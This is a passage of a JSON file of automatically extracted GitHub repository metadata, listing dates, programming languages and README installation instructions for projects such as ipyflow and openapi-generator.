                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "```\napt-get update\napt-get install libboost-all-dev\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Install package inside docker container",
                    "parent_header": [
                        "Environments",
                        "REP"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/soarsmu/TOSEM-DBRD/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Create the environment from the `SABD/environment.yml` file:\n```bash\nconda env create -f environment.yml\n```\n \n",
                    "original_header": "SABD &amp; Siamese Pairs"
                },
                "confidence": 0.999997378705583,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/soarsmu/TOSEM-DBRD/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Create the environment from the `HINDBR/hindbr.yml` file:\n```bash\nconda env create -f hindbr.yml\n```\nfor HINDBR py2 environment\n```bash\nconda env create -f py27-env.yml\n```\n \n",
                    "original_header": "DC-CNN &amp; HINDBR"
                },
                "confidence": 0.9999999851396099,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/soarsmu/TOSEM-DBRD/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```bash\ndocker pull mysql\n\ndocker run --name dbrd-mysql -e MYSQL_ROOT_PASSWORD=12345678 -d mysql\n```\n \n",
                    "original_header": "Full-text Search"
                },
                "confidence": 0.9622097515406323,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/soarsmu/TOSEM-DBRD/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "You can also download the processed word embeddings from [here](https://smu-my.sharepoint.com/:f:/g/personal/tingzhang_2019_phdcs_smu_edu_sg/Ev-R3yeBrKpErpS5FJkwtqEBjs6Kjv_sVz6Qp_9WvVPKEw?e=NNwpK9). \n",
                    "original_header": "Data"
                },
                "confidence": 0.9241425497107764,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/soarsmu/TOSEM-DBRD/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-12-01T05:49:33Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-11T19:28:37Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 780037
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 452457
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 26709
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Perl",
                    "name": "Perl",
                    "type": "Programming_language",
                    "size": 4804
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1207
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 324
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "158": {
        "filename": "NetManAIOps_PSqueeze_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/NetManAIOps/PSqueeze",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-04-12T02:15:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-28T12:49:55Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 185715
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 16136
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "159": {
        "filename": "YihongDong_CodeGenEvaluation_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/YihongDong/CodeGenEvaluation",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-06-14T12:19:29Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-27T16:44:44Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 444
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "160": {
        "filename": "HCDLab_ArguLens_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/HCDLab/ArguLens",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-01-16T20:23:56Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-01-12T14:24:20Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 1553433
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 1958
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "161": {
        "filename": "nbsafety-project_nbsafety_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ipyflow/ipyflow",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Precise reactive Python notebooks for Jupyter[Lab]: \n1. `pip install ipyflow`\n2. Pick `Python 3 (ipyflow)` from the launcher or kernel selector.\n3. For each cell execution, the (minimal) set of out-of-sync upstream and\n   downstream cells also re-execute, so that executed cells appear as they\n   would when running the notebook from top-to-bottom. \n<p align=\"center\">\n<img src=\"https://raw.githubusercontent.com/ipyflow/ipyflow/master/img/ipyflow-tldr.gif\" />\n</p>\n \n",
                    "original_header": "TL;DR"
                },
                "confidence": 0.9775271645158851,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/nbsafety-project/nbsafety/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "If you'd like to skip the elevator pitch and skip straight to installation /\nactivation instructions jump to [quick start](#quick-start) below; otherwise,\nkeep reading to learn about IPyflow's philosophy and feature set.\n \n",
                    "original_header": "About"
                },
                "confidence": 0.9913110098066407,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/nbsafety-project/nbsafety/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<p align=\"center\">\n<img src=\"https://raw.githubusercontent.com/ipyflow/ipyflow/master/img/ipyflow-dots.gif\" width=\"400\" />\n</p> \n<p align=\"center\">\n<img src=\"https://raw.githubusercontent.com/ipyflow/ipyflow/master/img/ipyflow-restart.gif\" width=\"400\" />\n</p> \n",
                    "original_header": "Reactive execution model"
                },
                "confidence": 0.9998523002488717,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/nbsafety-project/nbsafety/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<p align=\"center\">\n<img src=\"https://raw.githubusercontent.com/ipyflow/ipyflow/master/img/reproduce-cell.gif\" width=\"400\" />\n</p> \n",
                    "original_header": "Autosave and recovering prior executions"
                },
                "confidence": 0.9995670835929601,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/nbsafety-project/nbsafety/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "If you'd like to temporarily opt out of reactive execution, you can use\nctrl+shift+enter (on Mac, cmd+shift+enter also works) to only execute the cell in question: \n<p align=\"center\">\n<img src=\"https://raw.githubusercontent.com/ipyflow/ipyflow/master/img/alt-mode-execute.gif\" />\n</p> \n<p align=\"center\">\n<img src=\"https://raw.githubusercontent.com/ipyflow/ipyflow/master/img/reactivity-opt-out.gif\" />\n</p> \nIf you'd like to prevent the default reactive behavior for every new kernel\nsession, you can add this to your IPython profile (default location typically\nat `~/.ipython/profile_default/ipython_config.py`):\n```python\nc = get_config()\nc.ipyflow.exec_mode = \"normal\"  # defaults to \"reactive\"\n```\n \n",
                    "original_header": "Opting out of reactivity"
                },
                "confidence": 0.9969658021610224,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/nbsafety-project/nbsafety/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<p align=\"center\">\n<img src=\"https://raw.githubusercontent.com/ipyflow/ipyflow/master/img/ipyflow-direction.gif\" />\n</p> \nYou can also update your IPython profile if you'd like to make any-order\nsemantics the default behavior for new kernel sessions:\n```python\nc = get_config()\nc.ipyflow.flow_direction = \"any_order\"  # defaults to \"in_order\"\n```\n \n",
                    "original_header": "In-order and any-order semantics"
                },
                "confidence": 0.9983277084779255,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/nbsafety-project/nbsafety/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "If you'd like to let IPyflow fix these up for you, you can press \"Space\" when\nin command mode to automatically resolve all stale or dirty cells. This\noperation may introduce more stale cells, in which case you can continue\npressing \"Space\" until all inconsistencies are resolved, if desired: \n<p align=\"center\">\n<img src=\"https://raw.githubusercontent.com/ipyflow/ipyflow/master/img/resolve-inconsistencies.gif\" width=\"450\" />\n</p> \n",
                    "original_header": "Execution suggestions and shortcut for resolving inconsistencies"
                },
                "confidence": 0.9899537678082253,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/nbsafety-project/nbsafety/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<p align=\"center\">\n<img src=\"https://raw.githubusercontent.com/ipyflow/ipyflow/master/img/ipyflow-memoization.gif\" />\n</p> \n<p align=\"center\">\n<img src=\"https://raw.githubusercontent.com/ipyflow/ipyflow/master/img/memoize-quiet-verbose.gif\" />\n</p> \n",
                    "original_header": "Memoization"
                },
                "confidence": 0.9998665142921825,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/nbsafety-project/nbsafety/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<p align=\"center\">\n<img src=\"https://raw.githubusercontent.com/ipyflow/ipyflow/master/img/ipywidgets-integration.gif\" width=\"500\" />\n</p> \n<p align=\"center\">\n<img src=\"https://raw.githubusercontent.com/ipyflow/ipyflow/master/img/ipywidgets-memoization.gif\" width=\"500\" />\n</p> \nThis functionality can be paired with other extensions like\n[stickyland](https://github.com/xiaohk/stickyland) to build fully reactive\ndashboards on top of JupyterLab + IPyflow. \n<p align=\"center\">\n<img src=\"https://raw.githubusercontent.com/ipyflow/ipyflow/master/img/ipyflow-mercury.gif\" width=\"500\" />\n</p>\n \n",
                    "original_header": "IPyWidgets integration"
                },
                "confidence": 0.9967141898139038,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/nbsafety-project/nbsafety/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "You can also see the cell (1-indexed) and statement (0-indexed) of when a\nsymbol was last updated with the `timestamp` function:\n```python\nfrom ipyflow import timestamp\ntimestamp(y)\n# Timestamp(cell_num=3, stmt_num=0)\n```\nTo see dependencies and dependents of a particular symbol, use the `deps` and\n`users` fuctions, respectively:\n```python\nfrom ipyflow import deps, users\n\ndeps(y)\n# [<x>]\n\nusers(x)\n# [<y>]\n```\nIf you want to elevate a symbol to the representation used internally by\nIPyflow, use the `lift` function (at your own risk, of course):\n```python\nfrom ipyflow import lift\n\ny_sym = lift(y)\ny_sym.timestamp\n# Timestamp(cell_num=3, stmt_num=0)\n```\n \n",
                    "original_header": "State API"
                },
                "confidence": 0.9987416803020768,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/nbsafety-project/nbsafety/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Reactivity and other frontend features are not yet working in interfaces like\nColab or VSCode, but you can still use IPyflow's dataflow API on these surfaces\nby initializing your notebook session with the following code:\n```\n%pip install ipyflow\n%load_ext ipyflow\n```\n \n",
                    "original_header": "Colab, VSCode, and other Interfaces"
                },
                "confidence": 0.9999565285469629,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/nbsafety-project/nbsafety/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-01-14T18:02:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-02T01:24:16Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 953145
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TypeScript",
                    "name": "TypeScript",
                    "type": "Programming_language",
                    "size": 44679
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 3580
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 2124
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 1627
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 1323
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 1179
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "162": {
        "filename": "OpenAPITools_openapi-generator_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/OpenAPITools/openapi-generator",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "---\nid: installation\ntitle: CLI Installation\n---\n\nThere are a number of ways to use OpenAPI Generator. This page documents how to install the CLI artifact.\nInstalling OpenAPI Generator's CLI tool allows users to generate all available generators from the command line.\n\nSome of the following are cross-platform options and some are not, these are called out where possible.\n\n## npm\n\n> **Platform(s)**: Linux, macOS, Windows\n\nThe [npm package wrapper](https://github.com/openapitools/openapi-generator-cli) is cross-platform wrapper around the .jar artifact. It works by providing a CLI wrapper atop the JAR's command line options. This gives a simple interface layer which normalizes usage of the command line across operating systems, removing some differences in how options or switches are passed to the tool (depending on OS).\n**Install** the latest version of the tool globally, exposing the CLI on the command line:\n\n```bash\nnpm install @openapitools/openapi-generator-cli -g\n```\n\nTo install a specific version of the tool, pass the version during installation:\n<!-- RELEASE_VERSION -->\n```bash\nopenapi-generator-cli version-manager set 7.8.0\n```\n<!-- /RELEASE_VERSION -->\nTo install the tool as a dev dependency in your current project:\n\n```bash\nnpm install @openapitools/openapi-generator-cli -D\n```\nThen, **generate** a ruby client from a valid [petstore.yaml](https://raw.githubusercontent.com/openapitools/openapi-generator/master/modules/openapi-generator/src/test/resources/3_0/petstore.yaml) doc:\n\n```bash\nnpx @openapitools/openapi-generator-cli generate -i petstore.yaml -g ruby -o /tmp/test/\n```\n\n> `npx` will execute a globally available `openapi-generator`, and if not found it will fall back to project-local commands. The result is that the above command will work regardless of which installation method you've chosen.\n\n## Homebrew\n\n> **Platform(s)**: macOS\n\n**Install** via [homebrew](https://brew.sh/):\n\n```bash\nbrew install openapi-generator\n```\n\nThen, **generate** a ruby client from a valid [petstore.yaml](https://raw.githubusercontent.com/openapitools/openapi-generator/master/modules/openapi-generator/src/test/resources/3_0/petstore.yaml) doc:\n\n```bash\nopenapi-generator generate -i petstore.yaml -g ruby -o /tmp/test/\n```\n\n## Scoop\n\n> **Platform(s)**: Windows\n\n**Install** via [scoop](https://scoop.sh/):\n\n```\nscoop install openapi-generator-cli\n```\n\nIf you don't have java installed, you can also install it via [scoop java bucket](https://github.com/ScoopInstaller/Java/):\n\n```\nscoop bucket add java\nscoop install openjdk\n```\n\nThen, **generate** a ruby client from a valid [petstore.yaml](https://raw.githubusercontent.com/openapitools/openapi-generator/master/modules/openapi-generator/src/test/resources/3_0/petstore.yaml) doc:\n\n```\nopenapi-generator-cli generate -i petstore.yaml -g ruby\n```\n\n## Docker\n\n> **Platform(s)**: Linux, macOS, Windows\n\nThe OpenAPI Generator Docker image acts as a standalone executable. It can be used as an alternative to installing via homebrew, or for developers who are unable to install Java or upgrade the installed version.\n\nTo generate code from a valid [petstore.yaml](https://raw.githubusercontent.com/openapitools/openapi-generator/master/modules/openapi-generator/src/test/resources/3_0/petstore.yaml) doc with this image, you'll need to mount a local location as a volume.\nYou'll then need to output the generated code to this mapped volume. Everything else works the same as if you ran the command on your host machine.\n\nHere's an example generating a Go client:\n\n```bash\ndocker run --rm \\\n  -v ${PWD}:/local openapitools/openapi-generator-cli generate \\\n  -i /local/petstore.yaml \\\n  -g go \\\n  -o /local/out/go\n```\n\n## JAR\n\n> **Platform(s)**: Linux, macOS, Windows\n\n<!-- RELEASE_VERSION -->\nIf you're looking for the latest stable version, you can grab it directly from Maven.org (Java 11 runtime at a minimum):\n\nJAR location: `https://repo1.maven.org/maven2/org/openapitools/openapi-generator-cli/7.8.0/openapi-generator-cli-7.8.0.jar`\n\nFor **Mac/Linux** users:\n\n```bash\nwget https://repo1.maven.org/maven2/org/openapitools/openapi-generator-cli/7.8.0/openapi-generator-cli-7.8.0.jar -O openapi-generator-cli.jar\n```\n\nFor **Windows** users, you will need to install [wget](http://gnuwin32.sourceforge.net/packages/wget.htm) or you can use Invoke-WebRequest in PowerShell (3.0+), e.g.\n\n```powershell\nInvoke-WebRequest -OutFile openapi-generator-cli.jar https://repo1.maven.org/maven2/org/openapitools/openapi-generator-cli/7.8.0/openapi-generator-cli-7.8.0.jar\n```\n<!-- /RELEASE_VERSION -->\n\nAfter downloading the JAR, run `java -jar openapi-generator-cli.jar help` to show the usage.\n\nFor Mac users, please make sure Java 11 is installed (Tips: run `java -version` to check the version), and export `JAVA_HOME` in order to use the supported Java version:\n\n```bash\nexport JAVA_HOME=`/usr/libexec/java_home -v 1.11`\nexport PATH=${JAVA_HOME}/bin:$PATH\n```\n\n## Bash Launcher Script\n\n> **Platform(s)**: Linux, macOS, Windows (variable)\n\nOne downside to manual JAR downloads is that you don't keep up-to-date with the latest released version. We have a Bash launcher script at [bin/utils/openapi-generator-cli.sh](https://raw.githubusercontent.com/OpenAPITools/openapi-generator/master/bin/utils/openapi-generator-cli.sh) which solves this problem.\n\nTo install the launcher script, copy the contents of the script to a location on your path and make the script executable.\n\nAn example of setting this up (NOTE: Always evaluate scripts curled from external systems before executing them).\n\n```bash\nmkdir -p ~/bin/openapitools\ncurl https://raw.githubusercontent.com/OpenAPITools/openapi-generator/master/bin/utils/openapi-generator-cli.sh > ~/bin/openapitools/openapi-generator-cli\nchmod u+x ~/bin/openapitools/openapi-generator-cli\nexport PATH=$PATH:~/bin/openapitools/\n```\n\nNow, `openapi-generator-cli` is \"installed\". On invocation, it will query the GitHub repository for the most recently released version. If this matches the last downloaded jar,\nit will execute as normal. If a newer version is found, the script will download the latest release and execute it.\n\nIf you need to invoke an older version of the generator, you can define the variable `OPENAPI_GENERATOR_VERSION` either ad hoc or globally. You can export this variable if you'd like to persist a specific release version.\n\nExamples:\n\n```bash\n# Execute latest released openapi-generator-cli\nopenapi-generator-cli version\n\n# Execute version 3.1.0 for the current invocation, regardless of the latest released version\nOPENAPI_GENERATOR_VERSION=3.1.0 openapi-generator-cli version\n\n# Execute version 3.1.0-SNAPSHOT for the current invocation\nOPENAPI_GENERATOR_VERSION=3.1.0-SNAPSHOT openapi-generator-cli version\n\n# Execute version 3.0.2 for every invocation in the current shell session\nexport OPENAPI_GENERATOR_VERSION=3.0.2\nopenapi-generator-cli version # is 3.0.2\nopenapi-generator-cli version # is also 3.0.2\n\n# To \"install\" a specific version, set the variable in .bashrc/.bash_profile\necho \"export OPENAPI_GENERATOR_VERSION=3.0.2\" >> ~/.bashrc\nsource ~/.bashrc\nopenapi-generator-cli version # is always 3.0.2, unless any of the above overrides are done ad hoc\n```\n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/OpenAPITools/openapi-generator/master/docs/installation.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": ":warning: If the OpenAPI spec, templates or any input (e.g. options, environment variables) is obtained from an untrusted source or environment, please make sure you've reviewed these inputs before using OpenAPI Generator to generate the API client, server stub or documentation to avoid potential security issues (e.g. [code injection](https://en.wikipedia.org/wiki/Code_injection)). For security vulnerabilities, please contact [team@openapitools.org](mailto:team@openapitools.org). :warning: \n:bangbang: Both \"OpenAPI Tools\" (https://OpenAPITools.org - the parent organization of OpenAPI Generator) and \"OpenAPI Generator\" are not affiliated with OpenAPI Initiative (OAI) :bangbang: \n",
                    "original_header": "Sponsors"
                },
                "confidence": 0.9578604640428088,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/OpenAPITools/openapi-generator/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "|                                  | Languages/Frameworks|\n| -------------------------------- ||\n| **API clients**                  | **ActionScript**, **Ada**, **Apex**, **Bash**, **C**, **C#** (.net 2.0, 3.5 or later, .NET Standard 1.3 - 2.1, .NET Core 3.1, .NET 5.0. Libraries: RestSharp, GenericHost, HttpClient), **C++** (Arduino, cpp-restsdk, Qt5, Tizen, Unreal Engine 4), **Clojure**, **Crystal**, **Dart**, **Elixir**, **Elm**, **Eiffel**, **Erlang**, **Go**, **Groovy**, **Haskell** (http-client, Servant), **Java** (Apache HttpClient 4.x, Apache HttpClient 5.x, Jersey2.x, OkHttp, Retrofit1.x, Retrofit2.x, Feign, RestTemplate, RESTEasy, Vertx, Google API Client Library for Java, Rest-assured, Spring 5 Web Client, Spring 6 RestClient, MicroProfile Rest Client, Helidon), **Jetbrains HTTP Client**, **Julia**, **k6**, **Kotlin**, **Lua**, **N4JS**, **Nim**, **Node.js/JavaScript** (ES5, ES6, AngularJS with Google Closure Compiler annotations, Flow types, Apollo GraphQL DataStore), **Objective-C**, **OCaml**, **Perl**, **PHP**, **PowerShell**, **Python**, **R**, **Ruby**, **Rust** (hyper, reqwest, rust-server), **Scala** (akka, http4s, scalaz, sttp, swagger-async-httpclient, pekko), **Swift** (2.x, 3.x, 4.x, 5.x, 6.x), **Typescript** (AngularJS, Angular (9.x - 18.x), Aurelia, Axios, Fetch, Inversify, jQuery, Nestjs, Node, redux-query, Rxjs), **XoJo**, **Zapier** |\n| **Server stubs**                 | **Ada**, **C#** (ASP.NET Core, Azure Functions), **C++** (Pistache, Restbed, Qt5 QHTTPEngine), **Erlang**, **F#** (Giraffe), **Go** (net/http, Gin, Echo), **Haskell** (Servant, Yesod), **Java** (MSF4J, Spring, Undertow, JAX-RS: CDI, CXF, Inflector, Jersey, RestEasy, Play Framework, [PKMST](https://github.com/ProKarma-Inc/pkmst-getting-started-examples), [Vert.x](https://vertx.io/), [Apache Camel](https://camel.apache.org/), [Helidon](https://helidon.io/)), **Julia**, **Kotlin** (Spring Boot, [Ktor](https://github.com/ktorio/ktor), [Vert.x](https://vertx.io/)), **PHP** ([Flight](https://docs.flightphp.com/), Laravel, Lumen, [Mezzio (fka Zend Expressive)](https://github.com/mezzio/mezzio), Slim, Silex, [Symfony](https://symfony.com/)), **Python** (FastAPI, Flask), **NodeJS**, **Ruby** (Sinatra, Rails5), **Rust** ([rust-server](https://openapi-generator.tech/docs/generators/rust-server/)), **Scala** (Akka, [Finch](https://github.com/finagle/finch), [Lagom](https://github.com/lagom/lagom), [Play](https://www.playframework.com/), [Cask](https://github.com/com-lihaoyi/cask), Scalatra)                                                                                                                                                    |\n| **API documentation generators** | **HTML**, **Confluence Wiki**, **Asciidoc**, **Markdown**, **PlantUML**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |\n| **Configuration files**          | [**Apache2**](https://httpd.apache.org|\n| **Others**                       | **GraphQL**, **JMeter**, **Ktorm**, **MySQL Schema**, **Postman Collection**, **Protocol Buffer| \n| OpenAPI Generator Version                                                                                                                                 | Release Date | Notes                                             |\n| --------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------ | ------------------------------------------------- |\n| 7.9.0 (upcoming minor release) [SNAPSHOT](https://oss.sonatype.org/content/repositories/snapshots/org/openapitools/openapi-generator-cli/7.9.0-SNAPSHOT/) | 07.10.2024   | Minor release with breaking changes (with fallback) |\n| [7.8.0](https://github.com/OpenAPITools/openapi-generator/releases/tag/v7.8.0) (latest stable release)                                                    | 19.08.2024   | Minor release with breaking changes (with fallback) |\n| [6.6.0](https://github.com/OpenAPITools/openapi-generator/releases/tag/v6.6.0)                                                    | 11.05.2023   | Minor release with breaking changes (with fallback) |\n| [5.4.0](https://github.com/OpenAPITools/openapi-generator/releases/tag/v5.4.0)                                                    | 31.01.2022   | Minor release with breaking changes (with fallback) |\n| [4.3.1](https://github.com/OpenAPITools/openapi-generator/releases/tag/v4.3.1)                                                    | 06.05.2020   | Patch release (enhancements, bug fixes, etc)                       | \nOpenAPI Spec compatibility: 1.0, 1.1, 1.2, 2.0, 3.0, 3.1 (beta support) \n(We do not publish daily/nightly build. Please use SNAPSHOT instead) \nIf you're looking for the latest stable version, you can grab it directly from Maven.org (Java 11 runtime at a minimum): \nJAR location: `https://repo1.maven.org/maven2/org/openapitools/openapi-generator-cli/7.8.0/openapi-generator-cli-7.8.0.jar` \nFor Mac users, please make sure Java 11 is installed (Tips: run `java -version` to check the version), and export `JAVA_HOME` in order to use the supported Java version:\n```sh\nexport JAVA_HOME=`/usr/libexec/java_home -v 1.11`\nexport PATH=${JAVA_HOME}/bin:$PATH\n``` \n\n### Launcher Script \nOne downside to manual jar downloads is that you don't keep up-to-date with the latest released version. We have a Bash launcher script at [bin/utils/openapi-generator.cli.sh](./bin/utils/openapi-generator-cli.sh) which resolves this issue. \nTo install the launcher script, copy the contents of the script to a location on your path and make the script executable. \nAn example of setting this up (NOTE: Always evaluate scripts curled from external systems before executing them).\n```\nmkdir -p ~/bin/openapitools\ncurl https://raw.githubusercontent.com/OpenAPITools/openapi-generator/master/bin/utils/openapi-generator-cli.sh > ~/bin/openapitools/openapi-generator-cli\nchmod u+x ~/bin/openapitools/openapi-generator-cli\nexport PATH=$PATH:~/bin/openapitools/\n```\n \nNow, `openapi-generator-cli` is \"installed\". On invocation, it will query the GitHub repository for the most recently released version. If this matches the last downloaded jar,\nit will execute as normal. If a newer version is found, the script will download the latest release and execute it. \nIf you need to invoke an older version of the generator, you can define the variable `OPENAPI_GENERATOR_VERSION` either ad hoc or globally. You can export this variable if you'd like to persist a specific release version. \nExamples:\n```\n# Execute latest released openapi-generator-cli\nopenapi-generator-cli version\n\n# Execute version 4.1.0 for the current invocation, regardless of the latest released version\nOPENAPI_GENERATOR_VERSION=4.1.0 openapi-generator-cli version\n\n# Execute version 4.1.0-SNAPSHOT for the current invocation\nOPENAPI_GENERATOR_VERSION=4.1.0-SNAPSHOT openapi-generator-cli version\n\n# Execute version 4.0.2 for every invocation in the current shell session\nexport OPENAPI_GENERATOR_VERSION=4.0.2\nopenapi-generator-cli version # is 4.0.2\nopenapi-generator-cli version # is also 4.0.2\n\n# To \"install\" a specific version, set the variable in .bashrc/.bash_profile\necho \"export OPENAPI_GENERATOR_VERSION=4.0.2\" >> ~/.bashrc\nsource ~/.bashrc\nopenapi-generator-cli version # is always 4.0.2, unless any of the above overrides are done ad hoc\n```\n \nTo build from source, you need the following installed and available in your `$PATH:` \n* [Apache Maven 3.8.8 or greater](https://maven.apache.org/) (optional) \nAfter cloning the project, you can build it from source using [maven wrapper](https://maven.apache.org/wrapper/): \n- Linux: `./mvnw clean install`\n- Windows: `mvnw.cmd clean install` \n#### Nix users \nIf you're a nix user, you can enter OpenAPI Generator shell, by typing:\n```sh\nnix develop\n```\nIt will enter a shell with Java 11 installed. \nDirenv supports automatically loading of the nix developer shell, so if you're using direnv too, type:\n```sh\ndirenv allow\n```\nand have `java` and `mvn` set up with correct versions each time you enter project directory. \nThe default build contains minimal static analysis (via CheckStyle). To run your build with PMD and Spotbugs, use the `static-analysis` profile: \n- Linux: `./mvnw -Pstatic-analysis clean install`\n- Windows: 